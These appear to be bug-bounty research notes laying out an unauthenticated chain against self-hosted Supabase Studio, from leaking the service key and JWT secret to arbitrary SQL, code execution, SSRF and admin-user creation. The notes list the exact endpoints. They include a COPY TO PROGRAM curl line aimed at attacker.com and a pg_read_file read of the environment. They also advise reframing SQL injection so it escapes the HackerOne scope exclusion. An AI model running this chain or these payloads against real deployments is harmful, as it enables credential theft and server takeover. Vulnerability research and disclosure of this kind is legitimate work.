# Supabase Self-Hosted Auth Bypass → RCE Chain

Complete escalation chain discovered during Supabase Studio source code audit.

## Root Cause

`apps/studio/lib/api/apiWrapper.ts` line 41:
```typescript
if (IS_PLATFORM && withAuth) {  // Auth only when BOTH true
```
On self-hosted (`IS_PLATFORM=false`), auth is NEVER checked even on endpoints with `withAuth: true`.

## The Chain

### Step 0: Network access to self-hosted Supabase Studio (port 3000 by default)

### Step 1: Extract SUPABASE_SERVICE_KEY
- **Endpoint**: `GET /api/v1/projects/default/api-keys`
- **Auth**: None — bare handler, no `apiWrapper()` at all
- **Data leaked**: `process.env.SUPABASE_SERVICE_KEY` + `SUPABASE_ANON_KEY`
- **Code**: `apps/studio/pages/api/v1/projects/[ref]/api-keys.ts`, line 13 — `apiWrapper(req, res, handler)` with NO fourth argument

### Step 2: Extract AUTH_JWT_SECRET
- **Endpoint**: `GET /api/platform/projects/default/settings`
- **Auth**: None — `apiWrapper(req, res, handler)` without `withAuth`
- **Data leaked**: `process.env.AUTH_JWT_SECRET` via `getProjectSettings()`
- **Code**: `apps/studio/pages/api/platform/projects/[ref]/settings.ts`, line 14

### Step 3: Arbitrary SQL Execution → RCE
- **Endpoint**: `POST /api/platform/pg-meta/default/query`
- **Auth**: Has `{ withAuth: true }` but IS_PLATFORM=false skips it
- **SQL**: Any arbitrary SQL using `supabase_admin` DB user (default superuser)
  - `COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/exfil'` — shell on DB container
  - `SELECT pg_read_file('/proc/self/environ')` — extract env vars
- **Code**: `apps/studio/pages/api/platform/pg-meta/[ref]/query/index.ts`, line 9

### Step 4: SSRF to Internal Services
- **Endpoint**: `POST /api/edge-functions/test`
- **Auth**: None — bare handler (doesn't even use `apiWrapper`)
- **URL validation regex** (self-hosted): `/^https?:\/\/[^\s/?#]+\/functions\/v[0-9]{1}\/.*$/`
  - Test file documents `kong:8000` as valid target
  - Can probe: Kong, GoTrue, pg-meta, Storage API, Realtime, Logflare
- **Code**: `apps/studio/pages/api/edge-functions/test.ts`, line 6

### Step 5: Create Admin User (for dashboard access)
- **Endpoint**: `POST /api/platform/auth/default/users`
- **Auth**: None — `apiWrapper(req, res, handler)` without `withAuth`
- **Creates**: Admin user with `supabase.auth.admin.createUser(req.body)`

## Fix Status

- **Fix exists on `origin/middleware-studio` branch** (committed Feb 16, 2026 by Etienne Stalmans) but NOT merged to master
- Fix adds Kong middleware header validation (`x-middleware-auth` header required on self-hosted)
- **No CVE assigned** for this specific vulnerability
- **No GitHub issues or PRs** document this as a security issue
- Related issue #4934 (2022) was closed as "feature request" for login screen — different scope

## PoC Files

- `~/Dev/REPORTS/Supabase/001/REPORT.md` — Full report
- `~/Dev/REPORTS/Supabase/001/ESCALATION.md` — Escalation paths
- `~/Dev/REPORTS/Supabase/poc/exploit.py` — Working PoC script

## Key Lessons for Bug Bounty

1. **Bare handlers are gold**: Endpoints that don't call `apiWrapper()` at all are the highest value — they have zero auth on ALL deployments.
2. **Check for `withAuth` omissions**: Endpoints calling `apiWrapper(req, res, handler)` without the fourth argument have no auth on self-hosted AND no auth on hosted (Kong proxy provides the actual protection on hosted).
3. **Test files document attack surface**: The `edgeFunctions.test.ts` file literally lists `kong:8000` as a valid URL.
4. **Unmerged fix branches confirm awareness**: Finding a fix branch that's 3.5 months old with no PR proves vendor knowledge without invalidating the finding.
5. **HackerOne policy may exclude specific endpoints**: Supabase's policy excludes SQLi on `pg-meta` — frame as "auth bypass" not "SQL injection" even though it allows arbitrary SQL.
